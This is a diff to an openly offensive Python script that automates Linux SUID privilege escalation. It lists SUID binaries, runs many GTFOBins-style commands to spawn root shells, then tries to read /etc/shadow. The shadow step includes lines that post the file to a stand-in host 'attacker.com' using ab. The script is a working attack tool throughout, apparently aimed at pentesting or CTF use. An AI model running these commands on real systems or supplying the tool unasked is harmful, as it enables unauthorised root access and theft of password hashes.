@@ -2,20 +2,26 @@ import os
 from colorama import Fore, Back, Style
 
 
-print (Style.BRIGHT, """ # Automated suid privilege escalation tool # """)
-print ("""-----------------------------------------------""")
-print (              """  #       https://github.com/ValentaA        # """)
-print ("""-----------------------------------------------""")
+def flsh_print(string):
+    print (string, flush = True)
+    
+flsh_print(Style.BRIGHT + """ # Automated suid privilege escalation tool # """)
+flsh_print ("""-----------------------------------------------""")
+flsh_print (              """  #       https://github.com/ValentaA        # """)
+flsh_print ("""-----------------------------------------------""")
 
 
 #If you get the shell but it's not root, just comment that specific command/commands or remove it from the 'get_root' list!
 
+#Save suid bits to file 
+flsh_print("[+]Saving available suid bits to file 'list.txt'")
+os.system("find / -type f -perm -04000 -ls 2>/dev/null > list.txt")
 
 #list suid option
-print ("[+]List suid bits?")
+flsh_print ("[+]List suid bits?")
 get_suid = input("[+]Y/N: ")
 if get_suid == "Y" or get_suid == "y":
-    print ("[+]Listing suids")
+    flsh_print ("[+]Listing suids")
     get_suid = os.system ("find / -type f -perm -04000 -ls 2>/dev/null")
 
 
@@ -59,18 +65,33 @@ get_root = ["./agetty -o -p -l /bin/sh -a root tty", "./agetty -o `-p` -l /bin/s
 "./xargs -a /dev/null sh -p", "./xargs -a /dev/null sh `-p`", "./xdotool exec --sync /bin/sh -p", 
 "./xdotool exec --sync /bin/sh `-p`", "./yash", "./zsh"]
 
+get_root_wth_pth = [item.lstrip("./") for item in get_root]
 
-for shell in get_root:
-    print ("[+]Trying to get root shell - CTRL + C if stuck")
-    shell = os.system(shell)
+with open ("list.txt", "r") as listed:
+    lsted = listed.read().splitlines()
     
 
-print ("[+]------------------------------")
-print ("[+]Continue with get /etc/shadow?")
+#Search with path added
+
+for shell in get_root:
+    flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
+    flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
+    os.system(shell)
+       
+       
+#Search without path added
+for shell in get_root_wth_pth: 
+    flsh_print ("[+]Trying to get root shell - CTRL + C if stuck")   
+    flsh_print ("[+]Use commands 'exit' or 'quit' to close the shell")
+    os.system(shell)
+
+
+flsh_print ("[+]------------------------------")
+flsh_print ("[+]Continue with get /etc/shadow?")
 option_hash = input("Y/N: ")
 
 
-#get_hash list
+#get_hash list:  
 #change url to attacker machine
 get_hash = ["URL=http://attacker.com/", "LFILE=file_to_send", "ab -p $LFILE $URL", "LFILE=/etc/shadow", './alpine -F "$LFILE"',
 "TF=$(mktemp -u)", "LFILE=/etc/shadow" './ar r "$TF" "$LFILE"', 'cat "$TF"',
@@ -126,11 +147,13 @@ get_hash = ["URL=http://attacker.com/", "LFILE=file_to_send", "ab -p $LFILE $URL
 
 for x in get_hash:
     if option_hash == "y" or option_hash == "Y":
-        print ("[*]Trying to read /etc/shadow - CTRL + C if stuck")
+        flsh_print ("[*]Trying to read /etc/shadow - CTRL + C if stuck")
         x = os.system(x)
+        
+#Clean suid bits file
+os.system("rm list.txt")
 
-
-print ("[+]------------------------------") 
-print ("[+]For more binaries and techniques visit: https://gtfobins.github.io/")  
-print("""----------------------------------------------------------------------""")
+flsh_print ("[+]------------------------------") 
+flsh_print ("[+]For more binaries and techniques visit: https://gtfobins.github.io/")  
+flsh_print("""----------------------------------------------------------------------""")
 
